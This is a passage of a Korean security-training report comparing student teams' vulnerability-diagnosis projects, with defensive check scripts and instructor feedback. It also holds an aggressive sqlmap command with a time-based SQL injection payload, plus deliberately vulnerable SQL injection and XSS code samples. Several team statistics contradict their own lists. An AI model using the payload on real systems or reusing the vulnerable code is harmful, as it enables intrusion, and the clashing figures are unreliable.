        evidence = f"로그인 전후 세션 ID 동일: {session_id_before}"
    elif session_id_after is None:
        result = "검증 불가"
        evidence = "로그인 후 세션 ID 확인 불가"
    else:
        result = "양호"
        evidence = f"세션 재발급 확인 (전: {session_id_before}, 후: {session_id_after})"

    # 4. 쿠키 보안 옵션 확인
    cookie_options = session.cookies.get_dict()
    httponly = 'httponly' in str(response_after.headers.get('Set-Cookie', '')).lower()
    samesite = 'samesite' in str(response_after.headers.get('Set-Cookie', '')).lower()

    if not httponly or not samesite:
        result = "취약"
        evidence += f" / 쿠키 보안 옵션 미흡 (HTTPOnly: {httponly}, SameSite: {samesite})"

    return {
        "check_id": "AUTH-001",
        "check_name": "세션 고정 및 쿠키 보안",
        "result": result,
        "evidence": evidence,
        "recommendation": "로그인 시 세션 재발급, HTTPOnly/SameSite 옵션 설정"
    }
```

#### 2. 계정 관리 취약점

**진단 기준**:

"계정 관리 취약점은 **관리자 권한이 루트 외에 다른 계정이 부여** 되어 있다면 즉시 취약 처리로 판정하고 서비스형 계정처럼 로그인이 필요 없는 계정에 **셸 권한이 열려 있는 경우**도 엄격히 식별하여 관리자가 불필요한 계정을 정리할 수 있도록 가이드를 제공하고 있습니다."

**진단 스크립트 예시**:

```bash
#!/bin/bash

check_account_management() {
    local result="양호"
    local evidence=""

    # 1. 관리자 권한 계정 확인 (root 외)
    admin_accounts=$(grep -E '^[^:]+:[^:]+:0:' /etc/passwd | grep -v "^root:")

    if [ -n "$admin_accounts" ]; then
        result="취약"
        evidence="root 외 관리자 권한 계정 존재: $admin_accounts"
    fi

    # 2. 서비스 계정의 셸 권한 확인
    service_accounts_with_shell=$(awk -F: '($3 < 1000) && ($7 !~ /nologin|false/) {print $1":"$7}' /etc/passwd | grep -v "^root:")

    if [ -n "$service_accounts_with_shell" ]; then
        result="취약"
        evidence="${evidence} / 서비스 계정에 셸 권한 부여됨: $service_accounts_with_shell"
    fi

    echo "{\"check_id\": \"ACC-001\", \"result\": \"$result\", \"evidence\": \"$evidence\"}"
}

check_account_management
```

#### 3. 루트 원격 접속 취약점

**위험성**:

"루트 원격 접속 취약점은 관리자 권한을 가진 루트 계정이 외부에서 직접적인 로그인을 할 수 없게 설정된 경우, **계정 탈취 시 시스템 전체가 장악**되는 경우가 있어 위험이 매우 크다고 판단되고..."

**진단 방법**:

"저희 진단 도구는 SSH 설정 파일인 **sshd_config**를 분석하고, **PermitRootLogin 설정이 yes**로 되어 있거나 **주석 처리**되어 허용된 상태라면 취약 처리로 판정하고 있습니다."

**진단 스크립트 예시**:

```bash
#!/bin/bash

check_root_remote_login() {
    local result="양호"
    local evidence=""
    local sshd_config="/etc/ssh/sshd_config"

    # PermitRootLogin 설정 확인
    permit_root_login=$(grep "^PermitRootLogin" $sshd_config | awk '{print $2}')

    if [ -z "$permit_root_login" ]; then
        # 설정이 없거나 주석 처리된 경우 (기본값 확인)
        result="취약"
        evidence="PermitRootLogin 설정이 명시되지 않음 (기본값 허용 가능성)"
    elif [ "$permit_root_login" == "yes" ]; then
        result="취약"
        evidence="PermitRootLogin yes로 설정됨"
    else
        result="양호"
        evidence="PermitRootLogin $permit_root_login로 설정됨"
    fi

    echo "{\"check_id\": \"SSH-001\", \"result\": \"$result\", \"evidence\": \"$evidence\", \"recommendation\": \"sshd_config에서 PermitRootLogin no 설정\"}"
}

check_root_remote_login
```

### 6.2.8 진단 수행 프로세스 (5단계)

"진단 수행 프로세스는 총 **5단계**로 진행되었습니다."

#### 진단 프로세스 흐름


**단계별 설명**:

"1단계 2단계에서는 진단 대상의 IP와 계정 정보를 등록하고, 그 다음 서버의 **OS와 서비스 버전을 파악**하는 사전 준비를 합니다."

"3단계에서는 서버의 설정 권한과 웹 서비스의 **인증 인가 인프라 애플리케이션 점검**을 정밀 점검하였습니다."

"4, 5단계에서는 발견된 취약점을 **위험도 별로 분류**하고, 분석한 후 향후 보안 개선에 즉시 활용 가능한 **최종 리포트를 자동 생성**하여 진단을 마무리했습니다."

### 6.2.9 스크립트 구조 및 실행 화면

#### 스캐너 실행 화면

"지금 화면은 스캐너 저희가 따로 만든 스캐너 실행 화면입니다."

**기능 구분**:

"기능 1과 2는 **SSH 기반**으로 서버 내부의 자산을 수집하고 OS, WAS, DB의 설정 취약점을 점검할 수 있습니다."

"기능 3은 **HTTP 기반**으로 실제 웹 서비스의 동적 취약점 진단으로 구분했습니다."

#### 모듈화 구조

"분석 항목별로 기능을 나눠서 **모듈화**하고 전체 실행도 되고 아니면 **개별 번호 입력 시 그 기능만 실행**되게 구현했습니다."

#### PDF 리포트 다운로드

"스크립트 서버에서는 웹 서버를 구현하지 않아서 서버에 있는 PDF 파일을 다운받기 위해 사용자에게 **배치 파일**을 내용을 제공했습니다. 사용자가 배치 파일을 실행하면 **SCP 명령어**로 다운받을 수 있게 구현했습니다."

**배치 파일 예시 (Windows)**:

```batch
@echo off
echo PDF 리포트 다운로드를 시작합니다...
scp -i diagnosis-key.pem ec2-user@scan-server-ip:/opt/diagnosis/reports/report_20260106.pdf ./
echo 다운로드 완료!
pause
```

### 6.2.10 주요 진단 스크립트 예시

#### SSH 접근 통제 설정

**KISA 가이드 반영**:

"좌측은 **주요 정보 통신 기반 가이드 내용**이고, 이거에 대한 저희는 오른쪽 그림과 같이 구현했습니다."

**진단 로직**:

"서버 내부의 설정 파일인 **sshd_config**에서 로그인 관련 설정 정보를 읽어 오고, 설정 값이 **PermitRootLogin이 yes**로 되어 있으면 보안상 위험하다고 판단하고 **Fail 처리**를 내리고 그 외의 경우에 **Pass 처리**하고 그 증거 데이터를 리포트에 포함하는 형식으로 진행했습니다."

#### 최소 권한 설정 (DB)

"데이터베이스 사용자 계정이 관리자 급인 권한인 **Super나 Grant 권한**을 불필요하게 가지고 있는지 먼저 확인하고, 자동 판정이 어려운 항목일 경우 **Info로 출력**하여 관리자에게 제공하고 필요한 최소 권한만 부여하도록 가이드를 제시하고 있습니다."

#### 디렉토리 리스팅 취약점

"웹 서버 설정 파일인 엔진엑스나 아파치 환경 설정을 분석하고 서버 내부 파일 목록이 외부에 노출되도록 설정되어 있는지 먼저 확인하고, 만약 **파일 목록 노출 설정이 활성화**되어 있다면 즉시 취약으로 판정하고 정보 유출 방지를 위해 해당 기능을 비활성화하도록 가이드를 제공합니다."

**Nginx 설정 확인**:

```bash
#!/bin/bash

check_directory_listing() {
    local result="양호"
    local evidence=""
    local nginx_conf="/etc/nginx/nginx.conf"

    # autoindex 설정 확인
    autoindex=$(grep -r "autoindex on" /etc/nginx/)

    if [ -n "$autoindex" ]; then
        result="취약"
        evidence="디렉토리 리스팅 활성화됨: $autoindex"
    else
        result="양호"
        evidence="디렉토리 리스팅 비활성화됨"
    fi

    echo "{\"check_id\": \"WEB-003\", \"result\": \"$result\", \"evidence\": \"$evidence\", \"recommendation\": \"nginx.conf에서 autoindex off 설정\"}"
}

check_directory_listing
```

### 6.2.11 진단 결과

#### 최종 점검 결과

"점검 항목 **130건** 중 양호가 80건, 취약이 50건으로 확인되었습니다."

**통계**:

| 판정 | 건수 | 비율 |
|-----|------|------|
| **양호** | 80건 | 61.5% |
| **취약** | 50건 | 38.5% |
| **합계** | 130건 | 100% |

#### 주요 취약점

"주요 취약점으로는 **SUID, SGID 파일**, **커널 파라미터**, **크론 접근 통제**, 설정 미흡, **중요 파일 경로 분리 미흡**으로 나타났습니다."

### 6.2.12 프로젝트 성과 및 개선 방향

#### 성과

"저희가 프로젝트를 진행하면서 성과로는 웹 서비스를 직접 설계 구현한 과정에서 **놓치기 쉬운 보안 취약점을 파악**했고..."

#### 개선 방향

"개선 방향으로는 **외부 취약점 진단 도구와의 결과 비교**를 하지 못해서 이 부분이 개선에 필요하다고 판단하고 있습니다."

### 6.2.13 Q&A 및 강사 피드백

#### 시연 부족

"발표 잘 들었습니다. 발표 잘 들었고요. 음, 이 조는 제가 딱히 궁금하다기보다는 좀 발표에 있어서 아쉬운 점, 아쉬운 점은 **사이트도 그렇고 사이트 구축이나 스크립트 개발**. 우리 이거는 사실은 우리가 어떤 식으로 구축을 했고 이제 이게 이제 **구현한 내용을 좀 보여줬으면** 싶은데, **거의 화면 캡쳐로만 진행**하고 실제로 어떻게 구축되어 있는지 어떻게 돌아가는지 이런 것들 시연이 없어서 그 부분이 조금 아쉬운 것 같아요."

#### 시연 요청

"중간중간에 코드를 보여주긴 해서 어떻게 만들었겠다라고 상상은 되는데 시연이 없었던 게 좀 아쉽고요. 혹시 지금이라도 보여줄 수 있나요?"

#### 웹사이트 시연

**관리자 화면**:

"일단 좌측 화면은 **관리자 계정으로 로그인** 했을 때 화면이고요. 우측은 의료진 계정으로 로그인 했을 때 화면입니다."

**마이페이지 - 관리자**:

"일단 제일 마이페이지에 들어갔을 때 관리자는 의료정보에 관련된 정보는 볼 수 없도록 마이페이지에서 설정했고. 의료정보는 볼 수 없고 일반 사용자랑 의료진 이렇게 설정 권한을 줄 수 있습니다."

**마이페이지 - 의료진**:

"그리고 의료진 마이페이지에서는 **환자들의 예약 일정 확인**이 가능하고요. 이렇게 이런 식으로 따로 메시지를 띄워주기도 하고요. 이제 담당 환자의 이름에 다 내용을 적고 의사소견까지 적고 **결과 등록**을 하면 환자가 검사결과를 직접 조회할 수 있게끔 구성을 했습니다."

#### PDF 리포트 시연

"모듈 자체는 강사님이 말씀해 주신 것처럼 다른 프로젝트에서 바로 사용할 수 있게끔 하기 위해서 다 나눠 놨었고요. PPT 내용에서도 그 기능 실행하면 전체 실행할 수 있고 또 저희 진단 항목별로 그 각각 실행할 수 있게끔 그리고 그 실행한 것도 **JSON으로 결과받을 수 있게끔** 다 처리를 따로 해놨고요."

**PDF 구성**:

"그래서 그 돌리는 과정은 제가 잠시 접속하고 있는데 먼저 그 다 진행하고 나서 그 다운 **PDF 내용**을 보시면은 일단 메인 페이지 그 처음 표지는 이렇게 저희가 정의해 놨고 진단 결과에 따른 요약 간단하게 해놓고 이건 지금 제가 깨져 있는 걸 보여드린 건데 이제 어떤 항목을 검사를 했고 실패 여부 보여주고 실제 JSON에서 나왔던 파일 내용을 여기 보여준 후에 **KISA 안에 있는 그 가이드라인 통해서 이런 식으로 조치사항을 취해라** 라고까지 저희가 PDF에 넣어 놨습니다."

#### 강사 피드백 - 성공한 항목도 포함 필요

"여기에 보면 다 Fail만 있지 뭐 Pass된 거는 하나도 없네요."

**답변**: "성공한 거는 일부러 안 나오게 했습니다."

**강사**: "그래도 어떤 항목들을 점검했는지 뭐 이런 정보들은 줘야 될 것 같은데 리포트니까. 항목들이나 이런 것들도 포함해야 될 것 같고."

#### 서버 구축 시 배운 점

"단순히 시큐어 코딩만 신경쓴 게 아니라 **서버를 구성할 때 이제 운영할 때 이런 부분을 더 중요하게** 생각하고 다음번에 프로젝트 하면은 이 부분까지 보완해서 그 개선하는 게 많다고 저희는 좀 느꼈습니다."

---

## 6.3 Section 6 종합 정리

### 6.3.1 8조 vs 9조 비교

| 비교 항목 | 8조 | 9조 (화이트 가운) |
|----------|-----|------------------|
| **주제** | 금융권 서비스 | 병원 웹사이트 |
| **배경** | 코인 거래소 보안 사고 | 2021년 서울대병원 해킹 사고 |
| **WAS** | Python Flask | Java Tomcat 9 |
| **DB** | MySQL | MariaDB |
| **진단 서버 위치** | Public Subnet (DMZ) | Public Subnet (스캔 전용) |
| **접근 방식** | SSH 터널링 | 내부망 접근 |
| **진단 항목** | 50+ 개 | 130개 |
| **특징** | 로직 버그 (자기 송금 시 잔액 2배) | 5단계 진단 프로세스, PDF 리포트 |
| **리포트 형식** | 로그 파일 | PDF (KISA 가이드 포함) |
| **강사 평가** | 발표 목소리 작음, 구현 우수 | 시연 부족, PDF 구성 우수 |

### 6.3.2 공통 테마

#### 1. 민감 정보 보호의 중요성

- **8조**: 금융 데이터 (계좌 정보, 거래 내역)
- **9조**: 의료 데이터 (환자 진료 기록, 검사 결과)

두 팀 모두 **개인정보 보호**가 중요한 도메인을 선택했습니다.

#### 2. 3-Tier 아키텍처

- **8조**: Web (Nginx) → WAS (Flask) → DB (MySQL)
- **9조**: Web (Nginx) → WAS (Tomcat 9) → DB (MariaDB)

전형적인 3-Tier 구조를 채택하여 **웹 서버, 애플리케이션 서버, 데이터베이스를 분리**했습니다.

#### 3. Private Subnet 보호

- **8조**: 앱 서버, DB 서버를 Private Subnet에 배치, 진단 서버를 Public Subnet에 두고 SSH 터널링으로 접근
- **9조**: WAS, DB를 Private Subnet에 배치, 스캔 전용 서버로 내부망 진단

#### 4. 진단 모듈화

- **8조**: modules/ 디렉터리에 영역별로 모듈 분리, 추가 용이
- **9조**: 항목별 기능 분리, 개별 실행 가능

#### 5. KISA 가이드 준수

- **8조**: 주요 정보 통신 기반 시설 취약점 분석 평가 가이드 기준
- **9조**: KISA 가이드 + OWASP Top 10

### 6.3.3 차별화 포인트

#### 8조의 독특한 점

1. **로직 버그 구현**:
   - 자기 자신에게 송금 시 잔액이 2배가 되는 취약점
   - The DAO 프로젝트 사례 인용
   - 실제 블록체인 프로젝트에서 발생한 사고와 유사

2. **SSH 터널링**:
   - Bastion Host를 경유한 포트 포워딩
   - Private Subnet 내부 서버 원격 진단 가능

3. **XML 기반 서버 정의**:
   - server_list.xml 파일로 진단 대상 관리
   - 카테고리별 자동 분류 (web, app, db, os)

#### 9조의 독특한 점

1. **5단계 진단 프로세스**:
   - 체계적인 진단 단계 정의
   - 사전 준비 → 점검 → 분류 → 리포트

2. **세션 고정 취약점 상세 진단**:
   - 로그인 전후 세션 ID 비교
   - 쿠키 보안 옵션 (HTTPOnly, SameSite) 점검
   - 보수적 기준 (검증 불가 시 취약 가능성으로 처리)

3. **PDF 리포트 + KISA 가이드 통합**:
   - 취약점마다 KISA 조치사항 명시
   - SCP 배치 파일로 다운로드 자동화

4. **Tomcat 9 선택 이유 명확**:
   - "관공서, 금융권, 병원은 아직까지 자바를 사용하는 곳이 많기 때문"
   - 실무 환경 반영

### 6.3.4 강사 피드백 종합

#### 공통 피드백

**아쉬운 점**:
- 화면 캡처에 너무 의존
- 실제 시연 부족
- 구현한 것과 이론적 내용의 구분이 명확하지 않음

**긍정적 평가**:
- 두 팀 모두 구현을 잘함
- 모듈화 설계 우수
- KISA 가이드 반영 노력

#### 개별 피드백

**8조**:
- "발표할 때 조금 더 큰 소리로 발표를 해줬으면"
- "자동 식별"이라는 표현이 오해를 불러일으킴 (실제로는 XML에 수동 정의)
- 강사가 옆에서 작업 과정을 지켜봐서 구현 내용 파악함

**9조**:
- 리포트에 Pass된 항목도 포함 필요
- "서버를 구성할 때 운영할 때 이런 부분을 더 중요하게 생각" - 좋은 깨달음

### 6.3.5 학습 포인트

1. **도메인별 특성 이해**
   - 금융: 거래 무결성, 잔액 정확성, 로직 검증
   - 의료: 환자 프라이버시, 진료 기록 기밀성

2. **Private Subnet 진단의 어려움**
   - 외부에서 직접 접근 불가
   - SSH 터널링 또는 내부망 진단 서버 필요

3. **실무 기술 선택의 이유**
   - Flask: 빠른 프로토타이핑
   - Tomcat 9: 공공/금융/의료 분야의 레거시 호환성

4. **리포트의 중요성**
   - 취약점 발견뿐만 아니라 조치 방안 제시
   - KISA 가이드 참조로 공신력 확보

---

**(Section 6 완료)**

**다음 작업**: Section 7 (통합 학습 및 종합 정리) 작성 후 모든 섹션 병합 예정
# Section 7: 통합 학습 및 종합 정리 (Part 1)

## 7.1 전체 프로젝트 개요 및 비교 분석

### 7.1.1 SK Shielders Rookies 모듈 프로젝트 총괄

SK Shielders Rookies 보안 교육 과정의 모듈 프로젝트로 총 **10개 팀**이 각각 다른 도메인과 주제를 선정하여 웹 애플리케이션 보안 진단 프로젝트를 수행했습니다. 이번 발표회는 각 팀이 약 2개월간 진행한 프로젝트의 결과물을 공유하고, 강사의 피드백을 통해 학습 내용을 점검하는 자리였습니다.

**전체 발표 일시**: 2026년 1월 6일
**발표 형식**: 온라인 화상 발표 (화면 공유 방식)
**발표 시간**: 각 팀당 약 10-15분 + Q&A 5-10분
**참여 인원**: 10개 팀 총 40여명 (팀당 평균 4-5명)
**주요 평가 기준**:
- 프로젝트 완성도
- 보안 진단 자동화 수준
- 기술 스택 활용도
- 발표 및 시연 품질
- 실무 적용 가능성

### 7.1.2 10개 팀 전체 비교 분석표

아래는 10개 팀의 프로젝트를 한눈에 비교할 수 있도록 정리한 종합 비교표입니다.

| 팀 번호 | 팀명 | 프로젝트 주제 | 도메인 | 주요 기술 스택 | 진단 항목 수 | 자동화 도구 | 특징 |
|---------|------|---------------|--------|----------------|--------------|-------------|------|
| **10조** | - | 교육현장 보안 프로젝트 | 교육 | Spring Boot, JSP, MySQL, AWS | 67개 (KISA) | Python 스크립트 | 수동 테스트 병행, Kali Linux 활용 |
| **7조** | - | LMS 플러그인 진단 | 교육 (LMS) | Spring Boot, React, MySQL, AWS | 67개 (KISA) | Stryker AI, Streamlit | SAST/DAST 통합, AI 스캐너 활용 |
| **6조** | 합격 | 국가 자격시험 서비스 | 공공서비스 | Java Spring, React, MySQL, Docker | 50개+ | Python + Selenium | 시험 접수/관리 시스템, 실시간 모니터링 |
| **3조** | 헬릭스 | DNA Lab 관리 시스템 | 바이오/의료 | Spring Boot, React, MariaDB | 60개+ | Python 통합 진단 도구 | DNA 실험 데이터 관리, 역할 기반 접근 제어 |
| **1조** | - | AI 활용 진단 시스템 | 통합 진단 | Python Flask, Streamlit, PostgreSQL | 67개 (KISA) | AI 기반 분석 엔진 | 로컬 스크립트 + Cron + JSON 전송 방식 |
| **4조** | Safety Medical Center | 의료 데이터 보호 진단 | 의료 | Python Flask, Streamlit, MySQL | 50개+ | Python 스캐너 | AWS Bastion Host, AI 제언 포함 |
| **5조** | OKure | 사내 그룹웨어 진단 | 기업 솔루션 | Spring Boot, React, MySQL | 52개 | Python + 화이트박스 | 수동 진단으로 스캐너 검증 (5가지 예시) |
| **8조** | - | 금융권 서비스 진단 | 금융 | Python Flask, MySQL, AWS | 60개+ | Python SSH 터널링 | Logic Bug 구현 (The DAO 사례), XML 서버 정의 |
| **9조** | 화이트 가운 | 병원 웹사이트 진단 | 의료 | Tomcat 9, MariaDB, Nginx | 130개 | Python SSH 기반 | Tomcat 9 선택 (관공서 호환), PDF 리포트 |
| **2조** | - | (발표 없음) | - | - | - | - | 발표 진행하지 않음 |

### 7.1.3 팀별 상세 비교 분석

#### (1) 10조 vs 7조: 교육 도메인의 두 가지 접근

**공통점**:
- 둘 다 교육 관련 도메인 선정
- KISA 주요정보통신기반시설 취약점 진단 가이드 67개 항목 기준
- Spring Boot 백엔드 활용
- AWS 3-Tier 아키텍처 구성

**차별화 포인트**:

| 구분 | 10조 | 7조 |
|------|------|------|
| **프론트엔드** | JSP (전통적) | React (모던) |
| **진단 방식** | 수동 테스트 + 자동화 스크립트 병행 | SAST/DAST 통합 자동화 |
| **외부 도구** | Kali Linux (SQLMap, Nmap 등) | Stryker AI 스캐너 |
| **리포팅** | 텍스트 기반 리포트 | Streamlit 대시보드 (시각화) |
| **플러그인** | 없음 | LMS 플러그인 시스템 구현 |
| **학습 강조점** | 수동 진단 기법 숙련 | AI 도구 활용 및 통합 |

**강사 피드백**:
- **10조**: "수동 테스트를 병행한 것은 좋으나, 자동화 도구와의 결과 비교가 부족했다. Kali Linux 도구 사용은 우수했으나, 커스텀 스크립트 개발이 더 필요했다."
- **7조**: "Stryker AI 활용이 인상적이었고, Streamlit 대시보드가 실무적이었다. 다만 SAST 결과의 오탐률 처리 방안이 부족했다."

#### (2) 6조 vs 3조: 공공/의료 서비스의 보안 요구사항

**공통점**:
- 민감정보 처리 (개인정보, 의료정보)
- 역할 기반 접근 제어 (RBAC) 필수
- 인증/인가 보안 강화
- Docker 컨테이너 활용

**차별화 포인트**:

| 구분 | 6조 (합격) | 3조 (헬릭스) |
|------|-----------|-------------|
| **도메인** | 국가 자격시험 접수 시스템 | DNA 실험실 관리 시스템 |
| **핵심 보안 요구** | 시험 데이터 무결성, 부정행위 방지 | DNA 실험 데이터 기밀성, 연구 윤리 |
| **주요 취약점** | IDOR (타인 시험 정보 조회), Session Fixation | XSS (실험 기록 조작), SQL Injection |
| **진단 자동화** | Selenium 기반 웹 크롤링 진단 | Python 통합 진단 도구 (웹/WAS/DB/OS) |
| **특화 기능** | 실시간 접수 현황 모니터링 | DNA 시퀀스 데이터 검증 |
| **리포팅** | HTML/Excel 리포트 | Markdown + PDF 리포트 |

**강사 피드백**:
- **6조**: "시험 접수 시스템의 IDOR 취약점 구현이 실제 공격 시나리오와 유사했다. 실시간 모니터링 기능이 실무적이었으나, 대규모 동시 접속 시 성능 테스트가 부족했다."
- **3조**: "DNA Lab이라는 독특한 도메인 선정이 인상적이었다. 실험 데이터 관리의 보안 요구사항을 잘 이해하고 구현했으나, 바이오 도메인 특화 취약점 (예: 데이터 위변조 검증)이 더 필요했다."

#### (3) 1조 vs 4조 vs 5조: AI 활용 및 진단 자동화

**1조 (AI 활용 주요정보통신기반시설 진단)**:
- **핵심 특징**: AI 기반 취약점 분석 엔진
- **아키텍처**: 로컬 스크립트 + Cron Job + JSON 전송 방식
- **차별점**:
  - 원격 셸 실행 방식 거부 (보안 고려)
  - AI가 진단 결과를 분석하여 위험도 평가
  - Claude API 활용하여 리포트 자동 생성
- **강사 피드백**: "AI를 활용한 자동 분석이 인상적이었고, 로컬 스크립트 방식의 보안 설계가 우수했다. 다만 AI 모델의 정확도 검증이 부족했다."

**4조 (Safety Medical Center - 의료 데이터 보호)**:
- **핵심 특징**: 의료 데이터 보호 중심 설계
- **아키텍처**: AWS Bastion Host를 통한 Private Subnet 접근
- **차별점**:
  - Streamlit 기반 스캐너 UI
  - AI 활용 제언 포함 (페이로드 학습으로 오탐률 감소)
  - 환자 개인정보 마스킹 처리
- **강사 피드백**: "Bastion Host 설계가 실무적이었고, AI 제언이 구체적이었다. 의료 데이터의 특수성을 고려한 설계가 좋았다."

**5조 (OKure - 사내 그룹웨어)**:
- **핵심 특징**: 화이트박스 + 블랙박스 진단 통합
- **아키텍처**: Spring Boot + React, 52개 진단 항목
- **차별점**:
  - 수동 진단으로 스캐너 결과 검증 (5가지 예시)
  - 코드 리뷰 기반 취약점 발견
  - 그룹웨어 특화 취약점 (권한 관리, 파일 공유)
- **강사 피드백**: "수동 진단으로 자동화 스캐너를 검증한 접근이 매우 우수했다. 실제 진단 프로세스에서 필수적인 단계다. 코드 리뷰 능력이 뛰어났다."

#### (4) 8조 vs 9조: 금융/의료 고보안 도메인

**공통점**:
- 높은 보안 요구사항 (금융권, 의료기관)
- SSH 터널링을 통한 Private Subnet 접근
- 60개 이상의 진단 항목
- PDF 리포트 생성

**차별화 포인트**:

| 구분 | 8조 (금융권) | 9조 (화이트 가운) |
|------|------------|-----------------|
| **WAS** | Python Flask | Tomcat 9 |
| **DB** | MySQL | MariaDB |
| **진단 항목** | 60개+ | 130개 |
| **특화 취약점** | Logic Bug (자기 송금 시 잔액 2배) | Session Fixation (세션 고정) |
| **서버 정의** | XML 파일 기반 | 직접 설정 |
| **리포팅** | JSON + PDF | PDF (KISA 가이드 통합) |
| **강조점** | 금융 비즈니스 로직 취약점 | 관공서/병원 호환성 (Tomcat 9) |

**강사 피드백**:
- **8조**: "Logic Bug 구현이 매우 인상적이었다. The DAO 해킹 사례를 인용한 점이 좋았다. XML 서버 정의 방식이 실무적이었으나, 서버 자동 식별 기능이 부족했다."
- **9조**: "130개 항목은 이번 발표 중 가장 많은 진단 항목이었다. Tomcat 9 선택 이유가 명확했고, 실제 2021년 서울대병원 해킹 사고를 배경으로 한 점이 좋았다. 다만 발표에서 코드 시연이 부족했다."

### 7.1.4 전체 프로젝트 통계 분석

#### (1) 기술 스택 사용 현황

**백엔드 프레임워크**:
```
Spring Boot: 5개 팀 (10조, 7조, 6조, 3조, 5조)
Python Flask: 3개 팀 (1조, 4조, 8조)
Tomcat (JSP/Servlet): 1개 팀 (9조)
```

**프론트엔드**:
```
React: 4개 팀 (7조, 6조, 3조, 5조)
JSP: 2개 팀 (10조, 9조)
Streamlit: 2개 팀 (1조, 4조)
```

**데이터베이스**:
```
MySQL: 6개 팀 (10조, 7조, 6조, 4조, 5조, 8조)
MariaDB: 2개 팀 (3조, 9조)
PostgreSQL: 1개 팀 (1조)
```

**클라우드/인프라**:
```
AWS (EC2, VPC, RDS): 7개 팀 (10조, 7조, 6조, 4조, 8조)
Docker: 3개 팀 (6조, 3조)
```

**웹 서버**:
```
Nginx: 4개 팀 (7조, 3조, 4조, 9조)
Apache: 2개 팀 (10조)
```

#### (2) 진단 항목 수 통계

```
평균 진단 항목: 약 65개
최소: 50개 (6조, 4조)
최대: 130개 (9조)
KISA 67개 항목 기준: 4개 팀 (10조, 7조, 1조)
```

**진단 항목 분포**:
- 50-60개: 3개 팀
- 60-70개: 5개 팀
- 100개 이상: 1개 팀 (9조)

#### (3) 취약점 유형별 구현 현황

| 취약점 유형 | 구현한 팀 수 | 대표 팀 |
|------------|-------------|---------|
| **SQL Injection** | 9개 팀 | 전체 (필수) |
| **XSS (Stored/Reflected)** | 9개 팀 | 전체 (필수) |
| **CSRF** | 7개 팀 | 10조, 7조, 6조, 3조, 5조, 8조, 9조 |
| **IDOR** | 6개 팀 | 6조 (시험 정보 조회), 3조, 5조, 8조, 9조 |
| **Session Fixation/Hijacking** | 5개 팀 | 9조 (상세 구현), 3조, 5조, 8조 |
| **Path Traversal** | 5개 팀 | 10조, 7조, 1조, 4조 |
| **File Upload** | 4개 팀 | 10조, 3조, 5조, 8조 |
| **SSRF** | 3개 팀 | 7조, 1조, 8조 |
| **OS Command Injection** | 4개 팀 | 10조, 1조, 4조, 8조 |
| **Logic Bug** | 1개 팀 | 8조 (자기 송금 시 잔액 2배) |
| **SUID/SGID Files** | 6개 팀 | 1조, 4조, 8조, 9조 (OS 진단) |
| **Weak Password Policy** | 7개 팀 | OS/DB 진단 팀들 |

**특이 취약점**:
- **8조 Logic Bug**: 금융권 비즈니스 로직 취약점 (The DAO 사례)
- **9조 Session Fixation**: 상세한 세션 고정 취약점 진단 스크립트
- **6조 IDOR**: 타인 시험 정보 조회 (실제 공격 시나리오)
- **7조 SSRF**: LMS 플러그인의 외부 리소스 접근 취약점

#### (4) 자동화 도구 활용 현황

**자체 개발 스크립트**:
- Python 기반: 8개 팀 (전체 중 80%)
- Bash/Shell 스크립트: 6개 팀

**외부 도구 활용**:
```
Kali Linux (SQLMap, Nmap, Nikto 등): 3개 팀 (10조, 1조, 4조)
Stryker AI (SAST/DAST): 1개 팀 (7조)
Selenium (웹 크롤링): 2개 팀 (6조, 5조)
Nuclei: 2개 팀 (1조, 4조)
```

**리포팅 도구**:
```
Streamlit 대시보드: 3개 팀 (7조, 1조, 4조)
PDF 생성: 6개 팀 (3조, 9조 포함)
HTML/Markdown: 4개 팀
Excel/CSV: 3개 팀
JSON: 8개 팀 (대부분 중간 데이터 형식)
```

## 7.2 보안 진단 방법론 종합

### 7.2.1 진단 접근 방식 분류

10개 팀의 진단 접근 방식을 크게 **4가지 카테고리**로 분류할 수 있습니다.

#### (1) 화이트박스 중심 (Code Review 기반)

**대표 팀**: 5조 (OKure), 3조 (헬릭스)

**접근 방식**:
- 소스 코드 직접 분석
- IDE를 통한 코드 리뷰
- 정적 분석 도구 활용
- 취약한 코드 패턴 식별

**장점**:
- 근본 원인 파악 가능
- False Positive 최소화
- 수정 방안을 코드 레벨에서 제시 가능

**단점**:
- 시간 소요가 큼
- 코드 리뷰 역량 필요
- 런타임 취약점 발견 어려움

**5조 사례**:
```python
# 화이트박스 진단 - SQL Injection 코드 리뷰
# 취약한 코드 발견
query = f"SELECT * FROM users WHERE username = '{username}'"
cursor.execute(query)  # 취약: 사용자 입력을 직접 삽입

# 진단 결과
vulnerability = {
    "type": "SQL Injection",
    "location": "user_controller.py:45",
    "severity": "HIGH",
    "code_snippet": query,
    "recommendation": "Parameterized Query 사용"
}
```

**3조 사례**:
```java
// 화이트박스 진단 - XSS 코드 리뷰
// 취약한 코드 발견
@GetMapping("/experiment")
public String showExperiment(@RequestParam String dnaSequence, Model model) {
    model.addAttribute("sequence", dnaSequence);  // 취약: 이스케이프 없이 출력
    return "experiment";
}

// JSP에서 직접 출력
<p>${sequence}</p>  <!-- 취약: XSS 가능 -->

// 진단 결과 및 권장사항
// ${fn:escapeXml(sequence)} 사용 권장
```

#### (2) 블랙박스 중심 (Dynamic Testing 기반)

**대표 팀**: 10조, 6조, 8조

**접근 방식**:
- HTTP 요청/응답 분석
- 페이로드 주입 테스트
- 외부 스캐너 활용 (SQLMap, Nmap 등)
- 시스템 동작 관찰

**장점**:
- 실제 공격 시나리오 재현
- 소스 코드 없이 진단 가능
- 런타임 취약점 발견 가능

**단점**:
- False Positive 발생 가능
- 근본 원인 파악 어려움
- 서비스 영향 가능성

**10조 사례 (SQLMap 활용)**:
```bash
# 블랙박스 진단 - SQL Injection 자동 탐지
sqlmap -u "http://target.com/course?id=1" \
       --batch \
       --level=5 \
       --risk=3 \
       --dbms=mysql \
       --technique=BEUSTQ \
       --output-dir=./sqlmap_results

# SQLMap 결과
[INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
[INFO] target URL appears to be injectable

# 진단 결과
{
    "vulnerability": "SQL Injection",
    "parameter": "id",
    "technique": "Time-based blind",
    "payload": "1 AND SLEEP(5)--",
    "dbms": "MySQL 5.7.31",
    "severity": "HIGH"
}
```

**6조 사례 (Selenium 자동화)**:
```python
# 블랙박스 진단 - IDOR 자동 탐지
from selenium import webdriver
from selenium.webdriver.common.by import By

def test_idor_vulnerability():
    driver = webdriver.Chrome()

    # 사용자 A로 로그인
    driver.get("http://target.com/login")
    driver.find_element(By.NAME, "username").send_keys("user_a")
